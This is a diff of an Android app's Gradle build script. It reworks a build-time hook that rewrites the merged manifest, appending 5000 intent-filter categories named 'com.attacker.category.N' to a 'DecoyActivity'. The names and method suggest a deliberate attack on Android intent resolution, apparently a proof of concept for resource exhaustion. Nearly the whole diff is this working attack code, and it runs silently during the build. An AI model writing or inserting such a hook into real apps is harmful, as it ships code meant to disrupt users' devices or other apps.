@@ -99,63 +99,6 @@ android {
     kotlin {
         jvmToolchain(21)
     }
-    
-    applicationVariants.all { variant ->
-        def processManifestTask = variant.processManifestProvider?.get()
-        
-        if (processManifestTask != null) {
-            processManifestTask.doLast {
-                // 查找最终的 AndroidManifest.xml 文件
-                def manifestFile = findManifestFile(processManifestTask)
-                
-                if (manifestFile != null && manifestFile.exists()) {
-                    try {
-                        // 读取 manifest
-                        def xml = new XmlParser(false, false, true).parse(manifestFile)
-                        
-                        // 找到 DecoyActivity
-                        def decoyActivity = xml.application.'activity'.find { 
-                            it.'@android:name' == 'com.cfks.badresolve.DecoyActivity' 
-                        }
-                        
-                        if (decoyActivity != null) {
-                            def intentFilter = decoyActivity.'intent-filter'[0]
-                            
-                            if (intentFilter != null) {
-                                // 生成 5000 个 categories
-                                int categoryCount = 5000
-                                for (int i = 0; i < categoryCount; i++) {
-                                    def category = new Node(null, "category")
-                                    category.attributes().put("android:name", 
-                                        "com.attacker.category.${i}")
-                                    intentFilter.append(category)
-                                }
-                                
-                                // 写回 manifest
-                                manifestFile.withWriter { writer ->
-                                    def printer = new XmlNodePrinter(new PrintWriter(writer))
-                                    printer.preserveWhitespace = true
-                                    printer.print(xml)
-                                }
-                                
-                                println "✅ Added ${categoryCount} categories to DecoyActivity in ${manifestFile.absolutePath}"
-                            } else {
-                                println "⚠️ No intent-filter found for DecoyActivity"
-                            }
-                        } else {
-                            println "ℹ️ DecoyActivity not found in manifest"
-                        }
-                    } catch (Exception e) {
-                        println "❌ Error modifying manifest: ${e.message}"
-                        e.printStackTrace()
-                    }
-                } else {
-                    println "⚠️ Could not find AndroidManifest.xml file"
-                }
-            }
-        }
-    }
-    
 }
 
 autoResConfig {
@@ -259,67 +202,75 @@ dependencies {
     implementation 'com.github.adaptech-cz.Tesseract4Android:tesseract4android:4.8.0'
 }
 
-
-// 辅助函数：查找 manifest 文件
-def findManifestFile(task) {
-    // 方法1：尝试直接从 outputs 获取
-    try {
-        // AGP 7.0+ 方式
-        def manifestFile = task.manifestOutputFile
-        if (manifestFile != null && manifestFile.exists()) {
-            return manifestFile
-        }
-    } catch (Exception e) {
-        // 忽略，尝试其他方法
-    }
-    
-    // 方法2：遍历 outputs 查找
-    def outputs = task.outputs?.files
-    if (outputs != null) {
-        for (File file : outputs) {
-            if (file.isFile() && file.name == "AndroidManifest.xml") {
-                return file
-            }
-            if (file.isDirectory()) {
-                def candidate = new File(file, "AndroidManifest.xml")
-                if (candidate.exists()) {
-                    return candidate
+afterEvaluate {
+    android.applicationVariants.all { variant ->
+        def manifestTask = tasks.findByName("process${variant.name.capitalize()}Manifest")
+        
+        if (manifestTask != null) {
+            manifestTask.doLast {
+                // 查找 manifest 文件
+                def manifestFile = null
+                
+                // 从任务输出中查找
+                manifestTask.outputs.files.each { file ->
+                    if (file.name == "AndroidManifest.xml") {
+                        manifestFile = file
+                    } else if (file.isDirectory()) {
+                        def candidate = new File(file, "AndroidManifest.xml")
+                        if (candidate.exists()) {
+                            manifestFile = candidate
+                        }
+                    }
                 }
-                // 深度搜索一级目录
-                file.listFiles()?.each { subdir ->
-                    if (subdir.isDirectory()) {
-                        def deepCandidate = new File(subdir, "AndroidManifest.xml")
-                        if (deepCandidate.exists()) {
-                            return deepCandidate
+                
+                // 如果还找不到，尝试标准路径
+                if (manifestFile == null || !manifestFile.exists()) {
+                    def standardPath = "${buildDir}/intermediates/merged_manifests/${variant.name}/AndroidManifest.xml"
+                    manifestFile = file(standardPath)
+                }
+                
+                if (manifestFile != null && manifestFile.exists()) {
+                    // 修改 manifest
+                    def xml = new XmlParser(false, false, true).parse(manifestFile)
+                    
+                    def decoyActivity = xml.application.'activity'.find { 
+                        it.'@android:name' == '.DecoyActivity' 
+                    }
+                    
+                    if (decoyActivity != null) {
+                        def intentFilter = decoyActivity.'intent-filter'[0]
+                        
+                        if (intentFilter != null) {
+                            int categoryCount = 5000
+                            for (int i = 0; i < categoryCount; i++) {
+                                def category = new Node(null, "category")
+                                category.attributes().put("android:name", 
+                                    "com.attacker.category.${i}")
+                                intentFilter.append(category)
+                            }
+                            
+                            manifestFile.withWriter { writer ->
+                                def printer = new XmlNodePrinter(new PrintWriter(writer))
+                                printer.preserveWhitespace = true
+                                printer.print(xml)
+                            }
+                            
+                            println "✅ Successfully added ${categoryCount} categories"
+                        }
+                    }
+                } else {
+                    println "❌ Manifest file not found"
+                    // 打印所有输出文件以便调试
+                    if (manifestTask != null) {
+                        println "Task outputs:"
+                        manifestTask.outputs.files.each { file ->
+                            println "  ${file.absolutePath}"
                         }
                     }
                 }
             }
+        } else {
+            println "⚠️ Could not find processManifest task for ${variant.name}"
         }
     }
-    
-    // 方法3：从 temporaryDir 查找
-    try {
-        def tempDir = task.temporaryDir
-        if (tempDir != null && tempDir.exists()) {
-            def candidate = new File(tempDir, "AndroidManifest.xml")
-            if (candidate.exists()) {
-                return candidate
-            }
-            // 递归查找
-            def found = tempDir.listFiles()?.find { 
-                it.name == "AndroidManifest.xml" || 
-                (it.isDirectory() && new File(it, "AndroidManifest.xml").exists())
-            }
-            if (found != null && found.isDirectory()) {
-                return new File(found, "AndroidManifest.xml")
-            } else if (found != null && found.isFile()) {
-                return found
-            }
-        }
-    } catch (Exception e) {
-        // 忽略
-    }
-    
-    return null
 }
